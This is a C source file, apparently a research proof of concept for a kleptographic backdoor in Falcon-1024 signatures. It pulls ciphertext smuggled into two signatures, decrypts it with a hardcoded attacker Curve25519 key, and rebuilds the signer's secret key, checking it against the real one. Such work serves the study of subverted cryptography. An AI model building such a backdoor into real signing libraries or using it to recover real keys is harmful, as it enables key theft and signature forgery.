#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <oqs/sig_falcon.h>
#include <oqs/rand.h>

#include "cecies/decrypt.h"
#include "cecies/types.h"

#define SEEDLEN       48
#define MESSAGELEN    50
#define INFOATTACK    80


// Info saved from the signatures
uint8_t ct_attack[INFOATTACK];
// Bytes already saved from the signatures
int start_attack = 0;


// Decrypt info in ct_attack
void attacker_decrypt(uint8_t** plaintext_dec) {
    size_t plaintext_len;

    cecies_curve25519_key private_key = {.hexstring = "48bddcca7d36729e0f54acedf7016b14c72423749757fc80d90d9017fea3cbc0"};

    if (cecies_curve25519_decrypt(ct_attack, INFOATTACK, 0, private_key, plaintext_dec, &plaintext_len)) {
        printf("cecies_curve25519_decrypt failed\n");
        exit(EXIT_FAILURE);
    }
}


// Recover the private key from the attacked party
int main() {
    uint8_t *pk, *sk, *generated_sk;
    uint8_t *sig, *message, *plaintext_dec;
    size_t siglen;
    int ret;

    pk = malloc(OQS_SIG_falcon_1024_length_public_key);
    sk = malloc(OQS_SIG_falcon_1024_length_secret_key);
    generated_sk = malloc(OQS_SIG_falcon_1024_length_secret_key);
    message = malloc(MESSAGELEN);
    plaintext_dec = malloc(32);
    sig = malloc(OQS_SIG_falcon_1024_length_signature);
    OQS_randombytes(message, MESSAGELEN); // message is not relevant


    ret = PQCLEAN_FALCON1024_CLEAN_crypto_sign_keypair(pk, sk);
    if (ret != 0) {
        printf("ERROR: PQCLEAN_FALCON1024_CLEAN_crypto_sign_keypair failed\n");
    }

    // 2 signatures to get the 80 bytes of the ciphertext
    for (int i = 0; i < 2; ++i) {

        ret = PQCLEAN_FALCON1024_CLEAN_crypto_sign_signature(sig, &siglen, message, MESSAGELEN, sk);
        if (ret != 0) {
            printf("ERROR: PQCLEAN_FALCON1024_CLEAN_crypto_sign failed\n");
        }

        ret = PQCLEAN_FALCON1024_CLEAN_crypto_sign_verify(sig, siglen, message, MESSAGELEN, pk);
        if (ret != 0) {
            printf("ERROR: PQCLEAN_FALCON1024_CLEAN_crypto_sign_verify failed\n");
        }

        // The ciphertext begins in the second byte of the signature
        for (int a = 0, s = start_attack; a < 40; a++) {
            ct_attack[a+s] = sig[a+1];
        }

        // Verificar se este é o primeiro ciphertext ou o segundo
        // Binário: 1000 0000 é 0x80 em hexadecimal
        // if (sig[0+1] < 0x80) {
        //   printf("Este é o primeiro ciphertext\n");
        // } else {
        //   printf("Este é o segundo ciphertext\n");
        // }
        start_attack += 40;

    }

    // Construct the private key from the ciphertext
    attacker_decrypt(&plaintext_dec);

    ret = PQCLEAN_FALCON1024_CLEAN_crypto_sign_keypair_attack(generated_sk, plaintext_dec);
    if (ret != 0) {
        printf("ERROR: PQCLEAN_FALCON1024_CLEAN_crypto_sign_keypair_attack failed\n");
    }

    // Check if the generated private key is equal to the real private key
    for (int i = 0; i < OQS_SIG_falcon_1024_length_secret_key; ++i) {
        // printf("%d\n", generated_sk[i]);
        // printf("%d\n", sk[i]);
        if (generated_sk[i] != sk[i]) {
            printf("wrong sk in index %ld\n", i);
        }
    }

    free(pk);
    free(sk);
    free(generated_sk);
    free(message);
    free(plaintext_dec);
    free(sig);

    return 0;
}
